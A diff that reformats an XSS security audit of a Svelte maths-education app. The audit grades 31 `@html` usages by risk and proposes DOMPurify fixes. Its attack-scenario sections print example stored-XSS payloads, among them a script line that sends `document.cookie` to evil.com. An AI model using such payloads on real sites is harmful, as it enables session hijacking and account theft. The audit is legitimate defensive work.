@@ -13,13 +13,13 @@ This audit analyzed all 31 instances of `@html` directive usage in the UbuMaths 
 
 ### Risk Distribution
 
-| Risk Level | Count | Status |
-|------------|-------|--------|
-| SAFE (properly sanitized) | 20 | No action needed |
-| LOW RISK (trusted source) | 3 | Acceptable |
-| MEDIUM RISK | 3 | Recommend fixes |
-| HIGH RISK | 4 | **Requires immediate attention** |
-| NEEDS VERIFICATION | 1 | Investigate data source |
+| Risk Level                | Count | Status                           |
+| ------------------------- | ----- | -------------------------------- |
+| SAFE (properly sanitized) | 20    | No action needed                 |
+| LOW RISK (trusted source) | 3     | Acceptable                       |
+| MEDIUM RISK               | 3     | Recommend fixes                  |
+| HIGH RISK                 | 4     | **Requires immediate attention** |
+| NEEDS VERIFICATION        | 1     | Investigate data source          |
 
 ---
 
@@ -30,6 +30,7 @@ This audit analyzed all 31 instances of `@html` directive usage in the UbuMaths 
 These usages are protected by HTML escaping or DOMPurify sanitization.
 
 #### 1. `src/lib/components/cas/HistoryEntry.svelte`
+
 - **Lines**: 50, 101, 138
 - **Variable**: `entry.result.outputHtml`
 - **Source**: WebReplEngine internal generation
@@ -37,36 +38,42 @@ These usages are protected by HTML escaping or DOMPurify sanitization.
 - **Status**: **SAFE** - All user input is escaped before HTML generation
 
 #### 2. `src/lib/components/markdown/MarkdownRaw.svelte`
+
 - **Line**: 138
 - **Variable**: `highlightedContent`
 - **Protection**: Content is first passed through `escapeHtml()` (line 70) before any regex replacements
 - **Status**: **SAFE** - XSS protection explicit in code comments
 
 #### 3. `src/lib/components/markdown/nodes/ImageDisplay.svelte`
+
 - **Line**: 154
 - **Variable**: `escapedCaption`
 - **Protection**: `$derived(caption ? escapeHtml(caption) : undefined)` on line 56
 - **Status**: **SAFE** - Properly escaped before rendering
 
 #### 4. `src/lib/components/markdown/nodes/TextNode.svelte`
+
 - **Lines**: 41, 42, 46, 49, 51
 - **Variable**: `escapedContent`
 - **Protection**: `$derived(escapeHtml(content))` on line 35
 - **Status**: **SAFE** - All content HTML-escaped
 
 #### 5. `src/lib/components/markdown/nodes/CodeBlock.svelte`
+
 - **Lines**: 36, 40
 - **Variable**: `escapedCode`
 - **Protection**: `$derived(escapeHtml(code))` on line 25
 - **Status**: **SAFE** - Code content properly escaped
 
 #### 6. `src/lib/components/markdown/nodes/TableNode.svelte`
+
 - **Lines**: 58, 70
 - **Variable**: `escapeHtml(cell.content)`
 - **Protection**: Direct inline escaping
 - **Status**: **SAFE** - Escaped at point of use
 
 #### 7. `src/routes/(protected)/dashboard/notifications/+page.svelte`
+
 - **Line**: 157
 - **Variable**: `sanitizeNotificationHtml(notification.message)`
 - **Protection**: DOMPurify with strict config (13 tags, 0 attributes)
@@ -80,6 +87,7 @@ These usages are protected by HTML escaping or DOMPurify sanitization.
 These usages render content from trusted internal sources with minimal user influence.
 
 #### 8. `src/lib/components/marketplace/teacher/MarketplaceAnalytics.svelte`
+
 - **Lines**: 383, 391
 - **Variables**: `createLineChart(...)`, `createBarChart(...)`
 - **Source**: Internally generated SVG from numeric analytics data
@@ -87,6 +95,7 @@ These usages render content from trusted internal sources with minimal user infl
 - **Status**: **LOW RISK** - Data is numeric analytics, not user text
 
 #### 9. `src/lib/components/worksheets/TypstEditor.svelte`
+
 - **Line**: 497
 - **Variable**: `svgContent`
 - **Source**: Typst compiler output (SVG)
@@ -100,6 +109,7 @@ These usages render content from trusted internal sources with minimal user infl
 #### 10-11. Documentation Pages (`/dashboard/admin/docs/`)
 
 **Files**:
+
 - `src/routes/(protected)/dashboard/admin/docs/+page.svelte` (line 156)
 - `src/routes/(protected)/dashboard/admin/docs/[...path]/+page.svelte` (line 171)
 
@@ -108,12 +118,14 @@ These usages render content from trusted internal sources with minimal user infl
 **Source**: Markdown files from `docs/` directory parsed via `marked` library
 
 **Current Flow**:
+
 1. Markdown read from filesystem (`docs/*.md`)
 2. Parsed via `marked.parse()` with syntax highlighting
 3. `addHeaderIds()` adds anchor IDs
 4. Rendered with `{@html}`
 
 **Risk Assessment**:
+
 - **Content Source**: Documentation files from repository (not user-submitted)
 - **Access Control**: Admin-only route (role check in `+page.server.ts`)
 - **Attack Vector**: If documentation files are modified maliciously (compromised repository)
@@ -122,19 +134,20 @@ These usages render content from trusted internal sources with minimal user infl
 **Status**: **MEDIUM RISK**
 
 **Recommendation**:
+
 ```typescript
 // In markdown-parser.ts, add DOMPurify sanitization:
 import DOMPurify from 'isomorphic-dompurify';
 
 export async function parseMarkdown(content: string, filePath: string): Promise<ParsedDocument> {
-  const metadata = extractMetadata(content, filePath);
-  const toc = generateTableOfContents(content);
-  const rawHtml = await marked.parse(content);
-  const html = DOMPurify.sanitize(rawHtml, {
-    ADD_TAGS: ['pre', 'code'],
-    ADD_ATTR: ['class', 'id', 'href', 'title']
-  });
-  return { html, metadata, toc };
+	const metadata = extractMetadata(content, filePath);
+	const toc = generateTableOfContents(content);
+	const rawHtml = await marked.parse(content);
+	const html = DOMPurify.sanitize(rawHtml, {
+		ADD_TAGS: ['pre', 'code'],
+		ADD_ATTR: ['class', 'id', 'href', 'title']
+	});
+	return { html, metadata, toc };
 }
 ```
 
@@ -148,27 +161,31 @@ export async function parseMarkdown(content: string, filePath: string): Promise<
 **Lines**: 323, 351, 390, 398
 
 **Variables**:
+
 - `exercise.statement.replace(/\n/g, '<br>')`
 - `exercise.solution.replace(/\n/g, '<br>')`
 
 **Source**: API response from `/api/worksheets/${worksheetId}/preview`
 
 **Current Flow**:
+
 1. Exercise content fetched from database via API
 2. `statement` and `solution` are markdown strings
 3. Only `\n` is replaced with `<br>` - **NO SANITIZATION**
 4. Rendered directly with `{@html}`
 
 **Attack Scenario**:
+
 ```javascript
 // Malicious exercise.statement stored in database:
-"<img src=x onerror=alert('XSS')>"
+"<img src=x onerror=alert('XSS')>";
 
 // Or more sophisticated:
-"<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
+"<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>";
 ```
 
 **Risk Assessment**: **HIGH**
+
 - Exercise content is teacher-created (user input)
 - Stored in database, retrieved via API
 - Direct rendering without sanitization enables stored XSS
@@ -177,20 +194,21 @@ export async function parseMarkdown(content: string, filePath: string): Promise<
 **Status**: **HIGH RISK - REQUIRES IMMEDIATE REMEDIATION**
 
 **Recommendation**:
+
 ```svelte
 <script>
-  import DOMPurify from 'isomorphic-dompurify';
+	import DOMPurify from 'isomorphic-dompurify';
 
-  // Sanitize and convert newlines safely
-  function sanitizeExerciseContent(content: string): string {
-    if (!content) return '';
-    // First sanitize, then convert newlines
-    const sanitized = DOMPurify.sanitize(content, {
-      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'br', 'p', 'ul', 'ol', 'li', 'code'],
-      ALLOWED_ATTR: []
-    });
-    return sanitized.replace(/\n/g, '<br>');
-  }
+	// Sanitize and convert newlines safely
+	function sanitizeExerciseContent(content: string): string {
+		if (!content) return '';
+		// First sanitize, then convert newlines
+		const sanitized = DOMPurify.sanitize(content, {
+			ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'br', 'p', 'ul', 'ol', 'li', 'code'],
+			ALLOWED_ATTR: []
+		});
+		return sanitized.replace(/\n/g, '<br>');
+	}
 </script>
 
 <!-- Replace all occurrences with: -->
@@ -203,34 +221,40 @@ export async function parseMarkdown(content: string, filePath: string): Promise<
 #### 16-17. Message Template Preview Pages
 
 **Files**:
+
 - `src/routes/(protected)/dashboard/admin/message-templates/+page.svelte` (line 757)
 - `src/routes/(protected)/dashboard/teacher/message-templates/+page.svelte` (lines 802, 986)
 
 **Variables**:
+
 - `previewHtml.body` (admin)
 - `template.body_template.slice(0, 300)` (teacher)
 - `previewBody` (teacher)
 
 **Source**:
+
 - Template body from database (`message_templates` table)
 - Preview rendered via `templateEngine.ts`
 
 **Current Flow**:
+
 1. Template stored in database by teacher/admin
 2. `renderTemplate()` or `previewTemplate()` performs variable substitution
 3. **NO HTML SANITIZATION** in template engine
 4. Rendered directly with `{@html}`
 
 **Attack Scenario**:
+
 ```javascript
 // Teacher creates malicious template body:
-"<p>Hello {{student_name}}</p><script>stealCredentials()</script>"
+'<p>Hello {{student_name}}</p><script>stealCredentials()</script>';
 
 // Or via template variable injection if variables aren't escaped:
 // student_name = "</p><script>alert('XSS')</script><p>"
 ```
 
 **Risk Assessment**: **HIGH**
+
 - Template body is teacher input stored in database
 - Template variables may contain user-generated content
 - No sanitization in `renderTemplate()` or in rendering
@@ -239,28 +263,29 @@ export async function parseMarkdown(content: string, filePath: string): Promise<
 **Status**: **HIGH RISK - REQUIRES IMMEDIATE REMEDIATION**
 
 **Recommendation**:
+
 ```typescript
 // In templateEngine.ts, sanitize output:
 import DOMPurify from 'isomorphic-dompurify';
 
 export function renderTemplate(
-  template: MessageTemplate,
-  data: Record<string, string | number | null | undefined>
+	template: MessageTemplate,
+	data: Record<string, string | number | null | undefined>
 ): RenderedTemplate {
-  // ... existing logic ...
+	// ... existing logic ...
 
-  // Sanitize final output
-  const sanitizedSubject = DOMPurify.sanitize(subject, { ALLOWED_TAGS: [] }); // Plain text
-  const sanitizedBody = DOMPurify.sanitize(body, {
-    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'h1', 'h2', 'h3'],
-    ALLOWED_ATTR: []
-  });
+	// Sanitize final output
+	const sanitizedSubject = DOMPurify.sanitize(subject, { ALLOWED_TAGS: [] }); // Plain text
+	const sanitizedBody = DOMPurify.sanitize(body, {
+		ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'h1', 'h2', 'h3'],
+		ALLOWED_ATTR: []
+	});
 
-  return {
-    subject: sanitizedSubject,
-    body: sanitizedBody,
-    // ...
-  };
+	return {
+		subject: sanitizedSubject,
+		body: sanitizedBody
+		// ...
+	};
 }
 ```
 
@@ -278,22 +303,26 @@ export function renderTemplate(
 **Source**: `RichTextEditor` component output bound via `bind:htmlValue`
 
 **Current Flow**:
+
 1. User types in RichTextEditor
 2. TipTap generates HTML
 3. Bound to `playgroundHtmlValue`
 4. Rendered in "Visual Render" section with `{@html}`
 
 **Risk Assessment**:
+
 - This is a **debug page** (admin-only access)
 - TipTap editor may have its own XSS protections
 - However, if TipTap can be tricked into outputting malicious HTML...
 
 **Status**: **NEEDS VERIFICATION**
+
 - Verify TipTap's HTML output sanitization
 - Consider if admin-only access is sufficient protection
 
 **Recommendation**:
 Even for debug pages, sanitize to prevent self-XSS:
+
 ```svelte
 import DOMPurify from 'isomorphic-dompurify';
 {@html DOMPurify.sanitize(playgroundHtmlValue)}
@@ -304,6 +333,7 @@ import DOMPurify from 'isomorphic-dompurify';
 ### SVG Content (3 usages) - Special Consideration
 
 **Files**:
+
 - `src/lib/components/worksheets/PdfPreview.svelte` (line 619)
 - `src/routes/(protected)/dashboard/admin/debug/typst-preview/+page.svelte` (line 343)
 
@@ -312,12 +342,14 @@ import DOMPurify from 'isomorphic-dompurify';
 **Source**: Typst WASM compiler output
 
 **Current Assessment**: These render SVG from the Typst compiler. While SVG can contain malicious content (scripts, event handlers), the Typst compiler:
+
 1. Generates SVG from its own typesetting engine
 2. Does not pass through user HTML directly
 
 **Status**: **LOW RISK** - Compiler-generated content
 
 **Recommendation** (Defense in depth):
+
 ```svelte
 import DOMPurify from 'isomorphic-dompurify';
 {@html DOMPurify.sanitize(svgContent, { USE_PROFILES: { svg: true } })}
@@ -335,12 +367,14 @@ import DOMPurify from 'isomorphic-dompurify';
 **Source**: Jupyter notebook cell output
 
 **Risk Assessment**: **MEDIUM**
+
 - Jupyter notebook HTML output is inherently user-generated code output
 - Standard Jupyter behavior allows HTML output from code cells
 - This is expected functionality for notebooks
 
 **Recommendation**:
 If notebooks are shared between users, consider sanitization:
+
 ```svelte
 import DOMPurify from 'isomorphic-dompurify';
 {@html DOMPurify.sanitize(output.data['text/html'])}
@@ -393,26 +427,26 @@ import DOMPurify from 'isomorphic-dompurify';
 
 ## Appendix: File-by-File Summary
 
-| File | Line(s) | Risk | Variable | Protection |
-|------|---------|------|----------|------------|
-| `HistoryEntry.svelte` | 50, 101, 138 | SAFE | `outputHtml` | `escapeHtml()` |
-| `CellOutputs.svelte` | 172 | MEDIUM | `text/html` | None |
-| `TypstEditor.svelte` | 497 | LOW | `svgContent` | Compiler |
-| `VariantPreview.svelte` | 323, 351, 390, 398 | **HIGH** | `statement/solution` | **NONE** |
-| `PdfPreview.svelte` | 619 | LOW | `svgContent` | Compiler |
-| `MarketplaceAnalytics.svelte` | 383, 391 | LOW | Chart SVG | Internal |
-| `MarkdownRaw.svelte` | 138 | SAFE | `highlightedContent` | `escapeHtml()` |
-| `ImageDisplay.svelte` | 154 | SAFE | `escapedCaption` | `escapeHtml()` |
-| `TextNode.svelte` | 41, 42, 46, 49, 51 | SAFE | `escapedContent` | `escapeHtml()` |
-| `CodeBlock.svelte` | 36, 40 | SAFE | `escapedCode` | `escapeHtml()` |
-| `TableNode.svelte` | 58, 70 | SAFE | `cell.content` | `escapeHtml()` |
-| `notifications/+page.svelte` | 157 | SAFE | `notification.message` | DOMPurify |
-| `admin/message-templates/+page.svelte` | 757 | **HIGH** | `previewHtml.body` | **NONE** |
-| `admin/docs/+page.svelte` | 156 | MEDIUM | `htmlWithIds` | None |
-| `admin/docs/[...path]/+page.svelte` | 171 | MEDIUM | `htmlWithIds` | None |
-| `admin/debug/rich-text/+page.svelte` | 817 | VERIFY | `playgroundHtmlValue` | TBD |
-| `admin/debug/typst-preview/+page.svelte` | 343 | LOW | `svgContent` | Compiler |
-| `teacher/message-templates/+page.svelte` | 802, 986 | **HIGH** | `template.body` | **NONE** |
+| File                                     | Line(s)            | Risk     | Variable               | Protection     |
+| ---------------------------------------- | ------------------ | -------- | ---------------------- | -------------- |
+| `HistoryEntry.svelte`                    | 50, 101, 138       | SAFE     | `outputHtml`           | `escapeHtml()` |
+| `CellOutputs.svelte`                     | 172                | MEDIUM   | `text/html`            | None           |
+| `TypstEditor.svelte`                     | 497                | LOW      | `svgContent`           | Compiler       |
+| `VariantPreview.svelte`                  | 323, 351, 390, 398 | **HIGH** | `statement/solution`   | **NONE**       |
+| `PdfPreview.svelte`                      | 619                | LOW      | `svgContent`           | Compiler       |
+| `MarketplaceAnalytics.svelte`            | 383, 391           | LOW      | Chart SVG              | Internal       |
+| `MarkdownRaw.svelte`                     | 138                | SAFE     | `highlightedContent`   | `escapeHtml()` |
+| `ImageDisplay.svelte`                    | 154                | SAFE     | `escapedCaption`       | `escapeHtml()` |
+| `TextNode.svelte`                        | 41, 42, 46, 49, 51 | SAFE     | `escapedContent`       | `escapeHtml()` |
+| `CodeBlock.svelte`                       | 36, 40             | SAFE     | `escapedCode`          | `escapeHtml()` |
+| `TableNode.svelte`                       | 58, 70             | SAFE     | `cell.content`         | `escapeHtml()` |
+| `notifications/+page.svelte`             | 157                | SAFE     | `notification.message` | DOMPurify      |
+| `admin/message-templates/+page.svelte`   | 757                | **HIGH** | `previewHtml.body`     | **NONE**       |
+| `admin/docs/+page.svelte`                | 156                | MEDIUM   | `htmlWithIds`          | None           |
+| `admin/docs/[...path]/+page.svelte`      | 171                | MEDIUM   | `htmlWithIds`          | None           |
+| `admin/debug/rich-text/+page.svelte`     | 817                | VERIFY   | `playgroundHtmlValue`  | TBD            |
+| `admin/debug/typst-preview/+page.svelte` | 343                | LOW      | `svgContent`           | Compiler       |
+| `teacher/message-templates/+page.svelte` | 802, 986           | **HIGH** | `template.body`        | **NONE**       |
 
 ---
 
